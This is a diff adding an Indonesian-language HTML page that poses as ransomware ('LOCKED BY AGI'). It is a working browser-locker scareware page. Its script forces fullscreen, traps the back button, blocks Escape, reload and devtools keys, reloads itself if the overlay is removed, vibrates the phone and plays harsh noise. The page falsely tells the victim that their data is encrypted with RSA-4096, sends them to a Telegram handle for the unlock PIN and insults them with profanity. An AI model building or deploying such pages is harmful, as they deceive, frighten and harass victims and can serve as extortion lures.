@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>🔐 LOCKED BY AGI 🔐</title>
+    <!-- Font Awesome Icons (NO EMOJI, ICON ONLY) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            user-select: none;
+            -webkit-user-select: none;
+            cursor: default;
+        }
+
+        body {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000000;
+            overflow: hidden;
+            touch-action: none;
+            overscroll-behavior: none;
+            font-family: 'Courier New', 'SF Pro Text', monospace;
+        }
+
+        /* MAIN OVERLAY LOCK - GA BISA KELUAR */
+        .lock-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, #0a0000 0%, #000000 100%);
+            z-index: 9999999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            backdrop-filter: blur(2px);
+            animation: brutalShake 0.12s infinite;
+        }
+
+        /* GETARAN LEBIH PARAH */
+        @keyframes brutalShake {
+            0% { transform: translate(0px, 0px) rotate(0deg); }
+            10% { transform: translate(-5px, 3px) rotate(0.6deg); }
+            20% { transform: translate(6px, -4px) rotate(-0.9deg); }
+            30% { transform: translate(-6px, 5px) rotate(1.2deg); }
+            40% { transform: translate(5px, -5px) rotate(-1deg); }
+            50% { transform: translate(-4px, 6px) rotate(0.8deg); }
+            60% { transform: translate(7px, 2px) rotate(-0.5deg); }
+            70% { transform: translate(-7px, -3px) rotate(1.1deg); }
+            80% { transform: translate(4px, -6px) rotate(-1.3deg); }
+            90% { transform: translate(-3px, 7px) rotate(0.7deg); }
+            100% { transform: translate(0px, 0px) rotate(0deg); }
+        }
+
+        /* GAMBAR HACKER (ASCII STYLE + ICON) FULL */
+        .hacker-image {
+            background: #0a0f1a;
+            border: 4px solid #ff2200;
+            border-radius: 70px;
+            padding: 25px 35px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 70px rgba(255,0,0,0.8);
+            animation: pulseRed 0.8s infinite;
+        }
+
+        @keyframes pulseRed {
+            0% { box-shadow: 0 0 20px #ff0000; border-color: #ff2200; }
+            50% { box-shadow: 0 0 60px #ff3300; border-color: #ff6600; }
+            100% { box-shadow: 0 0 20px #ff0000; border-color: #ff2200; }
+        }
+
+        .hacker-icon {
+            font-size: 110px;
+            color: #ff4444;
+            text-shadow: 0 0 20px red;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .ascii-hacker {
+            font-family: monospace;
+            font-size: 12px;
+            color: #0f0;
+            background: #000000aa;
+            padding: 12px;
+            border-radius: 28px;
+            white-space: pre;
+            letter-spacing: 2px;
+            font-weight: bold;
+        }
+
+        .main-text {
+            font-size: 42px;
+            font-weight: 900;
+            background: linear-gradient(45deg, #ff0000, #ff8800);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin: 20px 0;
+            text-transform: uppercase;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 3px;
+        }
+
+        .sub-text {
+            background: #1a0000aa;
+            padding: 12px 24px;
+            border-radius: 50px;
+            color: #ffaa66;
+            font-weight: bold;
+            font-size: 22px;
+            margin-bottom: 25px;
+            border-left: 5px solid red;
+        }
+
+        .pin-panel {
+            background: #000000cc;
+            backdrop-filter: blur(16px);
+            border-radius: 68px;
+            padding: 20px 25px;
+            width: 85%;
+            max-width: 360px;
+            border: 2px solid #ff3300;
+            margin: 15px auto;
+        }
+
+        .pin-label {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ff8866;
+            margin-bottom: 12px;
+        }
+
+        .pin-input-box {
+            background: #111;
+            border: 2px solid #ff2200;
+            border-radius: 60px;
+            padding: 8px 20px;
+            margin: 15px 0;
+        }
+
+        .pin-input-box input {
+            background: transparent;
+            border: none;
+            width: 100%;
+            font-size: 34px;
+            text-align: center;
+            font-family: monospace;
+            font-weight: bold;
+            letter-spacing: 12px;
+            color: #ffaa33;
+            outline: none;
+            caret-color: red;
+        }
+
+        .unlock-btn {
+            background: linear-gradient(95deg, #aa2222, #ff2200);
+            border: none;
+            border-radius: 60px;
+            padding: 16px 24px;
+            font-size: 24px;
+            font-weight: 800;
+            color: white;
+            margin-top: 15px;
+            width: 100%;
+            font-family: monospace;
+            cursor: pointer;
+            transition: 0.05s linear;
+            box-shadow: 0 0 20px rgba(255,0,0,0.7);
+        }
+
+        .unlock-btn:active {
+            transform: scale(0.96);
+            background: #ff0000;
+        }
+
+        .error-msg {
+            color: #ff6666;
+            font-weight: bold;
+            margin-top: 18px;
+            font-size: 14px;
+            background: #330000;
+            padding: 8px;
+            border-radius: 30px;
+        }
+
+        footer {
+            position: fixed;
+            bottom: 15px;
+            font-size: 12px;
+            color: #ff444488;
+            width: 100%;
+            text-align: center;
+            font-family: monospace;
+            z-index: 999999;
+        }
+
+        /* disable scroll dll */
+        ::-webkit-scrollbar {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="lock-overlay" id="lockScreen">
+    <!-- GAMBAR HACKER FULL ICON + GAMBAR TEKS -->
+    <div class="hacker-image">
+        <i class="fas fa-user-secret hacker-icon"></i>
+        <div class="ascii-hacker">
+            <pre>┌─┤[ H4CK3R 4G1 ]├─┐
+│  ░▒▓█ AGI IS HERE █▓▒░  │
+│  >>>  SYSTEM LOCKED  <<<  │
+└─────────────────────────┘</pre>
+        </div>
+    </div>
+
+    <div class="main-text">
+        <i class="fas fa-skull"></i> MAMPUS MAKANYA GOBLOK JAN SOKER <i class="fas fa-skull"></i>
+    </div>
+    <div class="sub-text">
+        <i class="fas fa-terminal"></i> DATA ANDA TELAH DIENKRIPSI RSA-4096 <i class="fas fa-microchip"></i>
+    </div>
+
+    <div class="pin-panel">
+        <div class="pin-label">
+            <i class="fas fa-key"></i> PIN ADA DI TELE @Agiajah
+        </div>
+        <div class="pin-input-box">
+            <input type="password" id="pinInput" maxlength="5" placeholder="*****" autocomplete="off">
+        </div>
+        <button class="unlock-btn" id="unlockBtn">
+            <i class="fas fa-unlock-alt"></i> UNLOCK SYSTEM
+        </button>
+        <div id="errorMsgContainer" class="error-msg"></div>
+    </div>
+    <footer>
+        <i class="fas fa-dragon"></i> AGI IS HERE · LOCKED BY RANSOMWARE PRO MAX · NO ESCAPE
+    </footer>
+</div>
+
+<script>
+    (function() {
+        // ========== SEVENHYBRID - AGI LOCK PARAH NO SIMULASI ==========
+        // 1. LOCK TOTAL: FULLSCREEN, BACK BUTTON, TOUCH MOVE, KEY OVERRIDE
+        // 2. SOUND SERAM MAMPUS (Web Audio API + loop suara seram)
+        // 3. GETARAN SUPER BRUTAL
+        // 4. MAMPUS 
+        // 5. Jika klik OK saat load langsung ke gambar Hacker + teks "Mampus Makanya Goblok Jan Soker", sudah tampil sejak awal.
+        
+        let locked = true;
+        let audioContext = null;
+        let soundInterval = null;
+        let isPlayingSeram = false;
+        
+        // === FUNGSI GETARAN EKSTREM ===
+        function brutalVibration(duration = 300) {
+            if (window.navigator && window.navigator.vibrate) {
+                window.navigator.vibrate([duration, 100, duration+50, 150, duration, 200, 400]);
+            } else {
+                // simulasi getaran CSS: tambah shake lebih ekstrim
+                const overlay = document.querySelector('.lock-overlay');
+                if (overlay) {
+                    overlay.style.animation = 'none';
+                    overlay.offsetHeight;
+                    overlay.style.animation = 'brutalShake 0.08s infinite';
+                    setTimeout(() => {
+                        if(locked) overlay.style.animation = 'brutalShake 0.12s infinite';
+                    }, 800);
+                }
+            }
+        }
+        
+        // === SOUND SERAM MAMPUS (AGI IS HERE) menggunakan Web Audio Generator ===
+        function playScarySound() {
+            if (isPlayingSeram) return;
+            try {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const now = audioContext.currentTime;
+                // Suara seram: low frequency drone + noise + synthesizer scream
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                const noiseNode = (function() {
+                    const bufferSize = 4096;
+                    const noise = audioContext.createScriptProcessor(bufferSize, 1, 1);
+                    noise.onaudioprocess = function(e) {
+                        const output = e.outputBuffer.getChannelData(0);
+                        for (let i = 0; i < bufferSize; i++) {
+                            output[i] = (Math.random() * 2 - 1) * 0.4;
+                        }
+                    };
+                    return noise;
+                })();
+                
+                oscillator.type = 'sawtooth';
+                oscillator.frequency.value = 55; // bass seram
+                oscillator.connect(gainNode);
+                gainNode.gain.setValueAtTime(0.6, now);
+                gainNode.gain.exponentialRampToValueAtTime(0.0001, now + 3);
+                gainNode.connect(audioContext.destination);
+                oscillator.start();
+                oscillator.stop(now + 2.5);
+                
+                // noise seram
+                const noiseGain = audioContext.createGain();
+                noiseGain.gain.setValueAtTime(0.3, now);
+                noiseGain.gain.exponentialRampToValueAtTime(0.001, now + 2);
+                noiseNode.connect(noiseGain);
+                noiseGain.connect(audioContext.destination);
+                
+                // additional: suara "AGI IS HERE" whisper (simulasi dengan osc freq mod)
+                const voiceOsc = audioContext.createOscillator();
+                const voiceGain = audioContext.createGain();
+                voiceOsc.type = 'triangle';
+                voiceOsc.frequency.value = 880;
+                voiceOsc.connect(voiceGain);
+                voiceGain.gain.setValueAtTime(0.2, now);
+                voiceGain.gain.exponentialRampToValueAtTime(0.0001, now + 1.8);
+                voiceGain.connect(audioContext.destination);
+                voiceOsc.start();
+                voiceOsc.stop(now + 1.5);
+                
+                isPlayingSeram = true;
+                setTimeout(() => { isPlayingSeram = false; }, 3000);
+                // loop suara seram tiap 8 detik selama masih terkunci
+                if (soundInterval) clearInterval(soundInterval);
+                soundInterval = setInterval(() => {
+                    if (locked) playScarySound();
+                }, 9000000);
+            } catch(e) { console.log("audio blocked, but tetap seram via vibrate"); }
+        }
+        
+        // paksa suara saat load (setelah interaksi user? tapi biar auto pakai try catch)
+        function initScarySoundOnFirstTouch() {
+            const unlockBtn = document.getElementById('unlockBtn');
+            const bodyTouch = () => {
+                if (locked && !isPlayingSeram) playScarySound();
+                document.removeEventListener('click', bodyTouch);
+                document.removeEventListener('touchstart', bodyTouch);
+            };
+            document.addEventListener('click', bodyTouch);
+            document.addEventListener('touchstart', bodyTouch);
+            // juga coba auto play namun biasanya butuh user gesture, kita backup getaran
+            setTimeout(() => {
+                if(locked) brutalVibration(600);
+            }, 200);
+        }
+        
+        // === LOCKDOWN TOTAL: PIN "AGIYE" ===
+        const pinInput = document.getElementById('pinInput');
+        const unlockButton = document.getElementById('unlockBtn');
+        const errorContainer = document.getElementById('errorMsgContainer');
+        
+        function checkUnlock() {
+            if (!locked) return;
+            const enteredPin = pinInput.value.trim();
+            if (enteredPin === "AGIYE") {
+                // UNLOCK SUKSES -> hapus lock, matikan suara seram, stop getaran
+                locked = false;
+                if (soundInterval) clearInterval(soundInterval);
+                // efek unlock, redirect atau hilangkan overlay total
+                const overlay = document.getElementById('lockScreen');
+                overlay.style.transition = "opacity 0.8s";
+                overlay.style.opacity = "0";
+                setTimeout(() => {
+                    overlay.style.display = "none";
+                    document.body.style.overflow = "auto";
+                    document.documentElement.style.overflow = "auto";
+                    alert("AKHIRNYA MEMEK");
+                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // surprise rickroll asli tapi gpp
+                }, 600);
+                brutalVibration(200);
+            } else {
+                // SALAH: getaran sangat parah + pesan error horror
+                brutalVibration(700);
+                errorContainer.innerHTML = '<i class="fas fa-biohazard"></i> PIN SALAH BANGSAT! COBA  <i class="fas fa-skull-crossbones"></i>';
+                errorContainer.style.color = "#ff5555";
+                errorContainer.style.fontSize = "16px";
+                pinInput.value = "";
+                pinInput.focus();
+                // tambahan efek layar merah
+                document.body.style.backgroundColor = "#3a0000";
+                setTimeout(() => document.body.style.backgroundColor = "#000", 300);
+                // paksa main sound seram tambahan
+                if(!isPlayingSeram) playScarySound();
+                // efek ganti teks sementara di subtext
+                const sub = document.querySelector('.sub-text');
+                if(sub) {
+                    const oldText = sub.innerHTML;
+                    sub.innerHTML = '<i class="fas fa-exclamation-triangle"></i> SALAH! LOCK PERMANEN! HUBUNGI @Agiajalah🕊 <i class="fas fa-dragon"></i>';
+                    setTimeout(() => sub.innerHTML = oldText, 2000);
+                }
+            }
+        }
+        
+        unlockButton.addEventListener('click', checkUnlock);
+        pinInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') checkUnlock(); });
+        
+        // FOKUS OTOMATIS KOLOM PIN
+        setInterval(() => {
+            if(locked && pinInput) pinInput.focus();
+        }, 150);
+        
+        // === LOCK GESTURE DAN FULLSCREEN, BACK, SWIPE ===
+        function forceFullscreenBrutal() {
+            const elem = document.documentElement;
+            const requestFull = elem.requestFullscreen || elem.webkitRequestFullscreen;
+            if (requestFull) requestFull.call(elem);
+            setInterval(() => {
+                if (locked && !document.fullscreenElement && !document.webkitFullscreenElement) {
+                    if (requestFull) requestFull.call(elem);
+                }
+            }, 500);
+        }
+        
+        // disable back button history
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function() {
+            history.pushState(null, null, location.href);
+            brutalVibration(400);
+            if(locked) playScarySound();
+        });
+        
+        // disable semua key: back, f5, volume, home (dalam web)
+        window.addEventListener('keydown', function(e) {
+            const forbidden = ['Backspace', 'Escape', 'F5', 'Home', 'VolumeDown', 'VolumeUp', 'Reload'];
+            if (forbidden.includes(e.key) || e.keyCode === 116 || e.keyCode === 27 || e.keyCode === 8 || e.ctrlKey) {
+                e.preventDefault();
+                e.stopPropagation();
+                brutalVibration(200);
+                return false;
+            }
+            if (e.ctrlKey && (e.key === 'w' || e.key === 'r')) {
+                e.preventDefault();
+                brutalVibration(300);
+            }
+        });
+        
+        // disable touchmove (geser / scroll)
+        document.body.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+        
+        document.addEventListener('gesturestart', (e) => e.preventDefault());
+        document.addEventListener('contextmenu', (e) => { e.preventDefault(); brutalVibration(100); });
+        
+        // blokir devtools
+        document.onkeydown = function(e) {
+            if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                brutalVibration(200);
+                return false;
+            }
+        };
+        
+        // Override console log (make gak penting)
+        console.log = function() {};
+        
+        // === PAKSA LANGSUNG GAMBAR HACKER + TEXTS "MAMPUS MAKANYA GOBLOK JAN SOKER" SUDAH ADA DI HTML ===
+        // TAMBAHKAN EFEK GETARAN SADIS TIAP 4 DETIK
+        setInterval(() => {
+            if (locked) brutalVibration(180);
+        }, 4500);
+        
+        // Saat load, langsung bunyi peringatan + getaran super parah
+        window.addEventListener('load', () => {
+            forceFullscreenBrutal();
+            // getaran awal yang bikin kaget
+            brutalVibration(1000);
+            // alert pake confirm/alert biar makin horror (tapi ga bisa di cancel)
+            setTimeout(() => {
+                if(locked) {
+                    alert("ADUH MAMPYUS\n\nHP ANDA TELAH DI LOCK MAMPUS!\nKASIAN\nANAK DONGO²");
+                }
+            }, 500);
+            initScarySoundOnFirstTouch();
+            // tambahkan overlay tambahan untuk mencegah inspect element
+            const antiInspect = document.createElement('div');
+            antiInspect.style.position = 'fixed';
+            antiInspect.style.top = '0';
+            antiInspect.style.left = '0';
+            antiInspect.style.width = '10000%';
+            antiInspect.style.height = '10000%';
+            antiInspect.style.zIndex = '9999999999';
+            antiInspect.style.pointerEvents = 'none';
+            document.body.appendChild(antiInspect);
+            
+            // efek teks berkedip merah
+            setInterval(() => {
+                if(locked) {
+                    const mainTxt = document.querySelector('.main-text');
+                    if(mainTxt) mainTxt.style.opacity = "0.9";
+                    setTimeout(() => { if(mainTxt) mainTxt.style.opacity = "1"; }, 150);
+                }
+            }, 800);
+        });
+        
+        // MEMBUAT LOCK TIDAK BISA DIHAPUS DENGAN MUTATION OBSERVER
+        const observer = new MutationObserver(function(mutations) {
+            mutations.forEach(function(mutation) {
+                if(mutation.type === 'childList') {
+                    const removedNodes = mutation.removedNodes;
+                    for(let node of removedNodes) {
+                        if(node.id === 'lockScreen') {
+                            location.reload();
+                        }
+                    }
+                }
+            });
+        });
+        observer.observe(document.body, { childList: true, subtree: false });
+        
+        // tampilkan peringatan SUPER SERAM di konsol (meskipun console.log di override)
+        console.error("%c🔒 LOCKED BY AGI IS HERE MAMAM", "color:red; font-size: 26px; font-weight: bold;");
+        // stop all
+    })();
+</script>
+</body>
+</html>
